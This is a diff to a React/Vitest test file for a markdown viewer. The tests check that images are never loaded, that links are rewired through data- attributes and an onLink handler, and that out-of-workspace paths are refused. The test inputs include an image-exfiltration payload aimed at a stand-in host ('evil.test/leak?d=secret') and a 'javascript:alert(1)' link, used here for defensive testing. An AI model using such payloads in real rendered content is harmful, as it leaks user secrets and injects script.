@@ -2,6 +2,7 @@
 import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { MarkdownViewer } from "./MarkdownViewer.tsx";
+import { targetOf } from "./links.ts";
 import { ID_PREFIX, renderDocument, sanitize } from "./viewer-engine.ts";
 
 afterEach(cleanup);
@@ -72,14 +73,63 @@ describe("viewer engine (docs/SECURITY.md T10)", () => {
     expect(root.textContent).toContain(source);
   });
 
-  it("never keeps an image, so nothing is fetched", () => {
-    const root = dom(renderDocument("![chart](https://evil.test/leak?d=secret)").html);
+  it("shows images as links, as in chat, and never loads them", () => {
+    const root = dom(
+      renderDocument("![chart](https://evil.test/leak?d=secret) ![](diagram.png) ![x](ftp://a/b)")
+        .html,
+    );
     expect(root.querySelector("img")).toBeNull();
+    const [remote, local] = Array.from(root.querySelectorAll<HTMLElement>("a.image-ref"));
+    expect(remote?.textContent).toBe("[image: chart]");
+    expect(remote?.dataset).toMatchObject({
+      link: "external",
+      target: "https://evil.test/leak?d=secret",
+    });
+    expect(local?.textContent).toBe("[image: untitled]");
+    expect(local?.dataset).toMatchObject({ link: "document-file", target: "diagram.png" });
+    // Another scheme is neither: text only.
+    expect(root.querySelector("span.image-ref")?.textContent).toBe("[image: x]");
   });
 
-  it("drops javascript: links", () => {
-    const root = dom(renderDocument("[x](javascript:alert(1))").html);
-    expect(root.querySelector('a[href^="javascript"]')).toBeNull();
+  it("points every link at #, with where it leads in data- attributes", () => {
+    const root = dom(
+      renderDocument(
+        [
+          "[site](https://example.com/a) <https://example.com/b> https://example.com/c",
+          "[mail](mailto:a@example.com) [up](#plan) [doc](../README.md) [code](src/a.ts#L3)",
+          "See src/app.ts:42 and `lib/util.js`.",
+          "[bad](javascript:alert(1)) [ftp](ftp://example.com/)",
+        ].join("\n\n"),
+      ).html,
+    );
+    const links = Array.from(root.querySelectorAll<HTMLAnchorElement>("a"));
+    expect(links.every((a) => a.getAttribute("href") === "#")).toBe(true);
+    expect(
+      links.map((a) => [a.textContent, a.dataset.link, a.dataset.target, a.dataset.line]),
+    ).toEqual([
+      ["site", "external", "https://example.com/a", undefined],
+      ["https://example.com/b", "external", "https://example.com/b", undefined],
+      ["https://example.com/c", "external", "https://example.com/c", undefined],
+      ["mail", "external", "mailto:a@example.com", undefined],
+      ["up", "anchor", "plan", undefined],
+      ["doc", "document-file", "../README.md", undefined],
+      ["code", "document-file", "src/a.ts", "3"],
+      ["src/app.ts:42", "workspace-file", "src/app.ts", "42"],
+      ["lib/util.js", "workspace-file", "lib/util.js", undefined],
+      ["ftp", "none", undefined, undefined],
+    ]);
+    expect(root.querySelector("a.file-ref")?.textContent).toBe("src/app.ts:42");
+    // markdown-it refuses javascript: (and data:) links while parsing: they stay text.
+    expect(root.textContent).toContain("[bad](javascript:alert(1))");
+    expect(links[0]?.title).toBe("https://example.com/a");
+  });
+
+  it("links footnotes within the document", () => {
+    const root = dom(renderDocument("Text.[^1]\n\n[^1]: The note.").html);
+    const ref = root.querySelector<HTMLAnchorElement>("sup.footnote-ref a")!;
+    const target = targetOf(ref);
+    expect(target).toEqual({ kind: "anchor", id: "fn1" });
+    expect(root.querySelector(`#${CSS.escape(ID_PREFIX + "fn1")}`)).not.toBeNull();
   });
 
   it("cleans what plugins produce, not only the source", () => {
@@ -130,5 +180,40 @@ describe("MarkdownViewer", () => {
     render(<MarkdownViewer text={"# Only\n\ntext"} />);
     await screen.findByRole("heading", { name: "Only" });
     expect(screen.queryByRole("navigation", { name: "Contents" })).toBeNull();
+  });
+
+  it("follows links through onLink, scrolls anchors itself, and shows a refusal", async () => {
+    const scroll = vi.fn();
+    Element.prototype.scrollIntoView = scroll;
+    const onLink = vi
+      .fn()
+      .mockResolvedValueOnce(undefined)
+      .mockRejectedValueOnce("x.md is outside this thread's workspace");
+    render(
+      <MarkdownViewer
+        text={"# Plan\n\n[site](https://example.com/) [top](#plan) [x](../../x.md) [bad](ftp://a/)"}
+        onLink={onLink}
+      />,
+    );
+    const site = await screen.findByText("site");
+    const click = (element: Element) => {
+      const event = new MouseEvent("click", { bubbles: true, cancelable: true });
+      act(() => void element.dispatchEvent(event));
+      return event;
+    };
+    // The webview itself never follows a link.
+    expect(click(site).defaultPrevented).toBe(true);
+    expect(onLink).toHaveBeenLastCalledWith({ kind: "external", url: "https://example.com/" });
+
+    click(screen.getByText("top"));
+    expect((scroll.mock.contexts[0] as Element).id).toBe(`${ID_PREFIX}plan`);
+    expect(onLink).toHaveBeenCalledTimes(1);
+
+    click(screen.getByText("bad"));
+    expect(onLink).toHaveBeenCalledTimes(1);
+
+    click(screen.getByText("x"));
+    expect(onLink).toHaveBeenLastCalledWith({ kind: "file", path: "../../x.md", from: "document" });
+    expect((await screen.findByRole("alert")).textContent).toContain("outside");
   });
 });
